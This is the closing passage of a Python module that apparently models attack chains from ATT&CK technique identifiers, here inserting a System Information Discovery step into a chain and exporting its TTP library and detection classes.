                    self.techniques.get("T1082"),     # System Information Discovery
                ]
                # Insert after initial access
                for i, ttp in enumerate(additional_techniques):
                    if ttp and i + 2 < len(base_chain):
                        base_chain.insert(i + 2, ttp)
        
        return base_chain

# Export the main classes
__all__ = ["ComprehensiveTTPLibrary", "ComprehensiveTTP", "AttackTactic", "TTPIndicators", "VendorDetection"]